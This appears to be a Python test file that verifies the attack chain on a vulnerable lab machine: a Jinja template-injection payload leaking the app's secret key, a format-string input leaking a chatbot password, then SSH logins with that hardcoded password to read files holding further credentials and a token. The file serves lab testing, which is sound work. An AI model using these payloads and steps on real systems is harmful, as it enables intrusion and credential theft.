import socket
import unittest
from libraries.http_tests import check_http_payload_200
from libraries.cmd_tests import test_cmd_execution_over_ssh


class TestCrucible(unittest.TestCase):
	crucible_target_ip = "10.100.7.47"

	def test_0_crucible_report_ssti(self):
		result = check_http_payload_200(
			target_ip=self.crucible_target_ip,
			url_path="/report",
			params={"template": "{{ 7 * 7 }}"},
			port=8000,
		)

		self.assertTrue(result.success, msg=result.message)
		self.assertIn("49", result.data or "", msg="SSTI payload was not evaluated")

	def test_0_crucible_report_secret_leak(self):
		result = check_http_payload_200(
			target_ip=self.crucible_target_ip,
			url_path="/report",
			params={"template": "{{ config['SECRET_KEY'] }}"},
			port=8000,
		)

		self.assertTrue(result.success, msg=result.message)
		self.assertIn("mqD5uv0j", result.data or "", msg="Secret key not leaked")

	def test_1_chatbot_format_string_leak(self):
		"""Exploit format string in chatbot auth to leak password."""
		with socket.create_connection((self.crucible_target_ip, 5985), timeout=5) as sock:
			sock.settimeout(3)

			# Drain initial banner/prompt
			try:
				_ = sock.recv(4096)
			except Exception:
				pass

			# Trigger auth flow
			sock.sendall(b"auth\n")
			try:
				_ = sock.recv(4096)
			except Exception:
				pass

			# Send format string to print PASSWORD argument
			sock.sendall(b"%s\n")
			leaked = sock.recv(8182000).decode()
			leaked2 = sock.recv(8182000).decode()
			leaked += leaked2

		self.assertIn("mqD5uv0j", leaked, msg="Format string did not leak chatbot password")

	def test_2_starfall_credentials_leaked_in_chatbot_source_code(self):
		result = test_cmd_execution_over_ssh(
			target_ip=self.crucible_target_ip,
			username="crucible",
			password="mqD5uv0j",
			command="cat /opt/chatbot/main.c | grep qi6AJZin",
			expected_output="qi6AJZin",
		)

		self.assertTrue(result.success, msg=result.message)
	
	def test_2_forge_ssrf_documentation_leaked_in_energy_projections_dev_notes(self):
		result = test_cmd_execution_over_ssh(
			target_ip=self.crucible_target_ip,
			username="crucible",
			password="mqD5uv0j",
			command="cat /var/www/energy_projections/dev_notes.txt",
			expected_output="User-Agent must be \"STARFALLER\", token=ab5f4cad309",
		)



if __name__ == "__main__":
	unittest.main()
